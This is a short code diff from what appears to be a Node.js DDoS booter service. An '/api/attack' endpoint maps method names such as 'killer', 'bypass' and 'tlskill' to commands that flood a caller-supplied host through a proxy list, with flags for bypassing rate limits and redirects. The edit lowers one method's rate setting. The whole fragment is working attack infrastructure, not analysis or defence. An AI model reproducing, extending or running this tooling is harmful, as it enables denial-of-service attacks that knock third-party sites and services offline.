@@ -99,7 +99,7 @@ app.get("/api/attack", (req, res) => {
     "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
     "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
     "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
-    "attack": `node --max-old-space-size=65536 attack -m GET -m POST -u ${host} -s ${time} -p live.txt -t 5 -r 999 --ratelimit true --full true`
+    "attack": `node --max-old-space-size=65536 attack -m GET -m POST -u ${host} -s ${time} -p live.txt -t 5 -r 333 --ratelimit true --full true`
   };
 
   const command = commands[method.toLowerCase()];
